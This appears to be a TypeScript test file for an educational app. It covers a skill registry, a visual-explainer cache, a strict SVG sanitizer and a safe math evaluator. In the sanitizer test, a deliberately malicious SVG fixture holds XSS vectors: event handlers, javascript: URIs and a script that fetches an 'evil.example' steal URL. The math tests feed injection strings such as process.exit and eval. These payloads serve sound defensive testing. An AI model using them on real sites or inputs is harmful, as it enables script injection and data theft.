import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { renderMermaidSVG } from "beautiful-mermaid";
import { resolveAndValidateTeachingActivity } from "../lib/activity-registry";
import {
  closeDbForTesting,
  listTeachingActivitiesForLessonFromDb,
  loadStoreFromDb,
  saveStoreToDb,
} from "../lib/db";
import { emptyStore } from "../lib/learning";
import { TeachingSkillRegistry } from "../lib/skill-loader";
import { sanitizeSvgStrict } from "../lib/svg-sanitizer";
import {
  safeEvaluateMath,
  validateMathFormula,
} from "../lib/safe-math-eval";
import {
  buildVisualCacheKey,
  runVisualExplainer,
} from "../lib/visual-explainer";

function makeTempDb(): { cleanup: () => void } {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "learnos-ve-test-"));
  process.env.LEARNOS_DB_PATH = path.join(dir, "test.sqlite");
  closeDbForTesting();
  return {
    cleanup: () => {
      closeDbForTesting();
      delete process.env.LEARNOS_DB_PATH;
      try {
        fs.rmSync(dir, { recursive: true, force: true });
      } catch {}
    },
  };
}

test("TeachingSkillRegistry: compact static catalog protects KV cache, loads visual-explainer strictly on demand, and supports extensible future skills", () => {
  const registry = new TeachingSkillRegistry();
  const catalog = registry.listSkillCatalog();
  assert.ok(
    catalog.some((s) => s.name === "visual-explainer"),
    "Must discover skills/visual-explainer/SKILL.md",
  );

  // Static prompt catalog must stay lean (never dump full SKILL.md body into static prefix)
  const compact = registry.getCompactCatalogForSystemPrompt();
  assert.ok(compact.includes("visual-explainer"));
  assert.ok(
    compact.length < 400,
    `Compact skill catalog must stay short (<400 chars), got ${compact.length}`,
  );

  // Normal non-visual turn loads ZERO skills
  const idle = registry.resolveOnDemandSkills({
    userRequest: "把明天的学习时间挪到晚上八点",
    consecutiveFailures: 0,
  });
  assert.equal(idle.length, 0);

  // Action === "visualize" triggers visual-explainer
  const byAction = registry.resolveOnDemandSkills({ action: "visualize" });
  assert.equal(byAction.length, 1);
  assert.equal(byAction[0].name, "visual-explainer");
  assert.ok(byAction[0].body.includes("var(--ve-accent)"));

  // User request "用图解释" triggers visual-explainer
  const byRequest = registry.resolveOnDemandSkills({
    userRequest: "请用图解释一下 Agent Loop 的运行步骤",
  });
  assert.equal(byRequest.length, 1);

  // >= 2 consecutive failures triggers visual remediation skill
  const byFailures = registry.resolveOnDemandSkills({
    userRequest: "还是不太懂",
    consecutiveFailures: 2,
  });
  assert.equal(byFailures.length, 1);

  // Extensibility: registering a future skill (e.g. math-visualizer) works seamlessly
  registry.registerSkill({
    name: "math-visualizer",
    description: "数学几何与函数变换图解",
    version: "1.0.0",
    triggers: ["几何证明", "函数图像"],
    capabilities: ["svg_canvas"],
    body: "绘制清晰坐标系与辅助线。",
  });
  const extMatch = registry.resolveOnDemandSkills({
    userRequest: "帮我画出这个函数的函数图像",
  });
  assert.ok(extMatch.some((s) => s.name === "math-visualizer"));
});

test("Strict Whitelist SVG Sanitizer: blocks XSS/script/foreignObject/event handlers/external URLs while preserving semantic vars, local markers, and data-step", () => {
  const maliciousSvg = `
    <svg viewBox="0 0 600 300" onload="alert('xss')" xmlns="http://www.w3.org/2000/svg">
      <script>fetch("https://evil.example/steal")</script>
      <style>@import url("https://evil.example/a.css");</style>
      <foreignObject x="0" y="0" width="200" height="100">
        <body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)" /></body>
      </foreignObject>
      <defs>
        <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto">
          <path d="M 0 1 L 10 5 L 0 9 z" fill="var(--ve-line)" />
        </marker>
      </defs>
      <g data-step="1" onclick="evil()">
        <rect id="n1" x="20" y="40" width="160" height="60" rx="12" fill="var(--ve-accent-soft)" stroke="var(--ve-accent)" />
        <text x="100" y="75" text-anchor="middle" fill="var(--ve-ink)">步骤一</text>
      </g>
      <g data-step="2">
        <line x1="180" y1="70" x2="260" y2="70" stroke="var(--ve-line)" marker-end="url(#arrow)" />
        <use href="https://evil.example/sprite.svg#x" />
        <a href="javascript:alert(2)"><rect x="260" y="40" width="160" height="60" fill="url(https://evil.example/g)" /></a>
        <rect id="n2" x="260" y="40" width="160" height="60" rx="12" fill="var(--ve-emerald-soft)" stroke="var(--ve-emerald)" />
      </g>
    </svg>
  `;

  const res = sanitizeSvgStrict(maliciousSvg);
  assert.equal(res.ok, true);
  assert.ok(!/<script/i.test(res.sanitizedSvg), "Must strip <script>");
  assert.ok(!/<foreignObject/i.test(res.sanitizedSvg), "Must strip <foreignObject>");
  assert.ok(!/<style/i.test(res.sanitizedSvg), "Must strip <style>");
  assert.ok(!/\bon(load|click|error)\s*=/i.test(res.sanitizedSvg), "Must strip all on* handlers");
  assert.ok(!/javascript:/i.test(res.sanitizedSvg), "Must strip javascript: URI");
  assert.ok(!/evil\.example/i.test(res.sanitizedSvg), "Must strip external URLs");

  // Safe vector features preserved
  assert.ok(res.sanitizedSvg.includes('fill="var(--ve-accent-soft)"'));
  assert.ok(res.sanitizedSvg.includes('marker-end="url(#arrow)"'));
  assert.deepEqual(res.stepNumbers, [1, 2]);
  assert.ok(res.strippedElements.length >= 3);
  assert.ok(res.strippedAttributes.length >= 2);
});

test("Visual Explainer Engine: SQLite cache hit, contractVersion invalidation, ActivityRegistry validation, lessonId isolation, zero BKT mutation, and beautiful-mermaid rendering", async () => {
  const env = makeTempDb();
  try {
    const day = "2026-11-22";
    const store = {
      ...emptyStore(day),
      mastery: { "lesson-a": 35, "lesson-b": 0 },
    };
    saveStoreToDb(store, { trigger: "seed-ve-test" });

    let generatorCalls = 0;
    const mockGenerator = async ({ system }: { system: string; user: string }) => {
      generatorCalls += 1;
      // Confirm on-demand SKILL.md and LessonContract were injected
      assert.ok(system.includes("var(--ve-accent)"), "Must inject visual-explainer SKILL.md");
      assert.ok(system.includes("严禁展开的后续主题"), "Must inject LessonContract boundaries");
      return JSON.stringify({
        title: "曝光三角联动示意",
        summary: "直观理解光圈、快门与 ISO 的进光量平衡",
        visualType: "svg",
        svg: `<svg viewBox="0 0 640 300" xmlns="http://www.w3.org/2000/svg">
          <g data-step="1"><circle cx="160" cy="150" r="60" fill="var(--ve-accent-soft)" stroke="var(--ve-accent)" /></g>
          <g data-step="2"><circle cx="320" cy="150" r="60" fill="var(--ve-emerald-soft)" stroke="var(--ve-emerald)" /></g>
          <g data-step="3"><circle cx="480" cy="150" r="60" fill="var(--ve-amber-soft)" stroke="var(--ve-amber)" /></g>
        </svg>`,
        steps: [
          { stepNumber: 1, title: "光圈控制景深与通光孔径", explanation: "大光圈进光多且背景虚化强。" },
          { stepNumber: 2, title: "快门控制曝光时长与动态模糊", explanation: "高速快门凝固瞬间动作。" },
          { stepNumber: 3, title: "ISO 调节感光增益与噪点权衡", explanation: "暗光提 ISO 需权衡画面纯净度。" },
        ],
      });
    };

    const contractV1 = {
      assumedPrior: ["熟悉相机基本按键"],
      inScope: ["曝光三要素：光圈、快门、ISO 平衡关系"],
      outOfScope: ["后期 RAW 调色流程"],
      deferredTo: [
        {
          topic: "后期 RAW 调色与直方图精修",
          targetLessonId: "lesson-b",
          targetLessonTitle: "RAW 后期调色实战",
        },
      ],
      progressionStep: "第 1/3 步：建立曝光直觉",
      blueprintVersion: 1,
    };

    // 1. First run generates & persists in SQLite cache + lesson-a teaching_activities
    const r1 = await runVisualExplainer({
      lessonId: "lesson-a",
      lessonTitle: "手动模式与曝光三角",
      conceptId: "exposure-triangle",
      conceptSummary: "光圈、快门、ISO 共同决定画面曝光与风格",
      visualType: "svg",
      contract: contractV1,
      contractVersion: 1,
      customGenerator: mockGenerator,
    });
    assert.equal(generatorCalls, 1);
    assert.equal(r1.cacheHit, false);
    assert.equal(r1.skillLoaded, true);
    assert.equal(r1.card.visualType, "svg");
    assert.equal(r1.card.steps?.length, 3);
    assert.equal(r1.card.lessonId, "lesson-a");

    // 2. Second run with same (lessonId, contractVersion=1, conceptId, visualType) hits cache with ZERO generator calls!
    const r2 = await runVisualExplainer({
      lessonId: "lesson-a",
      lessonTitle: "手动模式与曝光三角",
      conceptId: "exposure-triangle",
      visualType: "svg",
      contract: contractV1,
      contractVersion: 1,
      customGenerator: mockGenerator,
    });
    assert.equal(generatorCalls, 1, "Cache hit must NOT invoke generator again");
    assert.equal(r2.cacheHit, true);
    assert.equal(r2.card.visualId, r1.card.visualId);

    // 3. Advancing contractVersion from v1 -> v2 invalidates cache and regenerates
    const k1 = buildVisualCacheKey({
      lessonId: "lesson-a",
      contractVersion: 1,
      conceptId: "exposure-triangle",
      visualType: "svg",
    });
    const k2 = buildVisualCacheKey({
      lessonId: "lesson-a",
      contractVersion: 2,
      conceptId: "exposure-triangle",
      visualType: "svg",
    });
    assert.notEqual(k1, k2);

    const r3 = await runVisualExplainer({
      lessonId: "lesson-a",
      lessonTitle: "手动模式与曝光三角",
      conceptId: "exposure-triangle",
      visualType: "svg",
      contract: { ...contractV1, blueprintVersion: 2 },
      contractVersion: 2,
      customGenerator: mockGenerator,
    });
    assert.equal(generatorCalls, 2, "Version bump must invalidate v1 cache and regenerate");
    assert.equal(r3.cacheHit, false);
    assert.equal(r3.card.contractVersion, 2);

    // 4. Strict lessonId isolation: lesson-a visuals NEVER leak to lesson-b!
    const actsA = listTeachingActivitiesForLessonFromDb("lesson-a");
    const actsB = listTeachingActivitiesForLessonFromDb("lesson-b");
    assert.ok(actsA.length >= 2);
    assert.equal(actsB.length, 0, "Lesson B must NOT see Lesson A's visual explanations");

    // 5. Decoupled from BKT mastery: viewing/generating visuals NEVER mutates verified mastery
    assert.equal(loadStoreFromDb(day).mastery["lesson-a"], 35);

    // 6. ActivityRegistry validates Level 2 SVG & Level 3 interactive_widget cleanly
    const validatedWidget = resolveAndValidateTeachingActivity({
      requestedType: "visual_explanation",
      rawSpec: {
        title: "工业革命时间线",
        prompt: "按阶段观察技术突破与社会变革",
        visualType: "interactive_widget",
        widget: {
          widgetType: "timeline",
          config: {
            events: [
              { time: "1765", label: "珍妮纺纱机", detail: "开启纺织机械化" },
              { time: "1776", label: "瓦特改良蒸汽机", detail: "动力摆脱地理限制" },
            ],
          },
        },
      },
    });
    assert.equal(validatedWidget.degraded, false);
    assert.equal(validatedWidget.effectiveType, "visual_explanation");

    // 7. beautiful-mermaid renders modern orthogonal SVG with live CSS variables
    const bSvg = renderMermaidSVG(
      `flowchart LR\n  A["感知 (Observe)"] --> B["决策 (Think)"] --> C["行动 (Act)"]`,
      {
        bg: "var(--ve-canvas)",
        fg: "var(--ve-ink)",
        accent: "var(--ve-accent)",
        transparent: true,
      },
    );
    assert.ok(bSvg.startsWith("<svg"));
    assert.ok(bSvg.includes("var(--ve-ink)"));
  } finally {
    env.cleanup();
  }
});

test("Level 3 Safe Math Evaluator: deterministic arithmetic, functions, variables, and security rejection", () => {
  // Precedence, power right-associativity, unary minus, parentheses
  assert.equal(safeEvaluateMath("2 + 3 * 4"), 14);
  assert.equal(safeEvaluateMath("(2 + 3) * 4"), 20);
  assert.equal(safeEvaluateMath("2 ^ 3 ^ 2"), 512);
  assert.equal(safeEvaluateMath("-3 + 5"), 2);

  // Variables & functions (photography exposure / ML decay)
  const exposure = safeEvaluateMath("100 / (aperture ^ 2) * shutter * (iso / 100)", {
    aperture: 2,
    shutter: 0.5,
    iso: 400,
  });
  assert.equal(exposure, 50);

  const clamped = safeEvaluateMath("clamp(round(exp(-t / s) * 100, 1), 0, 100)", {
    t: 0,
    s: 5,
  });
  assert.equal(clamped, 100);

  const ternary = safeEvaluateMath("lr > 0.5 ? 100 : lr * 10", { lr: 0.2 });
  assert.equal(ternary, 2);

  // Division by zero & domain errors return null safely (never throw)
  assert.equal(safeEvaluateMath("1 / 0"), null);
  assert.equal(safeEvaluateMath("sqrt(-4)"), null);
  assert.equal(safeEvaluateMath("log(0)"), null);

  // Security rejection: arbitrary JS, prototype access, forbidden tokens
  assert.equal(safeEvaluateMath("process.exit(1)"), null);
  assert.equal(safeEvaluateMath("constructor('return 1')()"), null);
  assert.equal(safeEvaluateMath("__proto__ + 1"), null);
  assert.equal(safeEvaluateMath("eval('1+1')"), null);
  assert.equal(safeEvaluateMath("1; alert(1)"), null);
  assert.equal(validateMathFormula("window.location", {}), false);
  assert.equal(validateMathFormula("a * x ^ 2 + b", { a: 1, x: 2, b: 3 }), true);
});

test("Level 3 Controlled Interactive Widgets: timeline & parameter_explorer validation, unsafe formula stripping, and fallback", async () => {
  const env = makeTempDb();
  try {
    // 1. Valid Level 3 interactive timeline
    const timelineRes = await runVisualExplainer({
      lessonId: "lesson-history",
      lessonTitle: "HTTP 协议演进史",
      conceptId: "http-evolution",
      visualType: "interactive_widget",
      title: "HTTP 1.0 → HTTP/3 关键演进时间线",
      widget: {
        widgetType: "timeline",
        config: {
          events: [
            {
              time: "1996 · HTTP/1.0",
              label: "短连接时代",
              detail: "每次请求都需重新建立 TCP 三次握手，高延迟场景吞吐受限。",
              cause: "早期网页以纯文本为主，资源数极少",
              impact: "推动了持久连接（Keep-Alive）需求",
              keyTakeaway: "连接建立开销大于传输本身时，复用成为第一瓶颈。",
              tags: ["TCP", "无状态"],
            },
            {
              time: "2015 · HTTP/2",
              label: "二进制分帧与多路复用",
              detail: "单条 TCP 连接并行交错传输多个流，消除应用层队头阻塞。",
              impact: "大幅降低页面首屏加载耗时",
            },
          ],
        },
      },
    });
    assert.equal(timelineRes.card.visualType, "interactive_widget");
    assert.equal(timelineRes.card.widget?.widgetType, "timeline");
    assert.equal(timelineRes.sanitizationWarnings.length, 0);

    // 2. Valid Level 3 parameter simulator with safe formula + one malicious formula stripped
    const simRes = await runVisualExplainer({
      lessonId: "lesson-photo",
      lessonTitle: "摄影曝光三角",
      conceptId: "exposure-triangle",
      visualType: "interactive_widget",
      title: "曝光三角实时联动模拟器",
      widget: {
        widgetType: "parameter_explorer",
        config: {
          parameters: [
            { name: "光圈 f值", key: "f", min: 1.4, max: 16, step: 0.2, defaultValue: 2.8, unit: "f/" },
            { name: "ISO 感光度", key: "iso", min: 100, max: 3200, step: 100, defaultValue: 200 },
          ],
          outputs: [
            { label: "相对进光量", formula: "round((iso / 100) * (16 / (f ^ 2)), 2)", unit: "EV", min: 0, max: 40 },
            { label: "恶意注入公式", formula: "process.exit(1)" },
          ],
          curve: {
            title: "不同光圈下的相对通光量",
            xVar: "x",
            xMin: 1.4,
            xMax: 16,
            yFormula: "(iso / 100) * (16 / (x ^ 2))",
            markerXVar: "f",
          },
          presets: [
            { label: "人像浅景深", values: { f: 1.8, iso: 100 }, note: "大光圈虚化背景" },
          ],
        },
      },
    });
    assert.equal(simRes.card.visualType, "interactive_widget");
    assert.equal(simRes.card.widget?.widgetType, "parameter_explorer");
    const outList = (simRes.card.widget?.config.outputs as Array<{ label: string }>) || [];
    assert.equal(outList.length, 1);
    assert.equal(outList[0].label, "相对进光量");
    assert.ok(simRes.card.widget?.config.curve);
    assert.ok(simRes.sanitizationWarnings.some((w) => w.includes("恶意注入公式")));

    // 3. Malformed Level 3 widget (0 events) degrades gracefully to safe Mermaid
    const degraded = await runVisualExplainer({
      lessonId: "lesson-bad-widget",
      lessonTitle: "降级测试",
      conceptId: "bad-timeline",
      visualType: "interactive_widget",
      widget: {
        widgetType: "timeline",
        config: { events: [] },
      },
    });
    assert.equal(degraded.card.visualType, "mermaid");
    assert.ok(degraded.card.mermaid);
    assert.ok(degraded.sanitizationWarnings.length > 0);
  } finally {
    env.cleanup();
  }
});
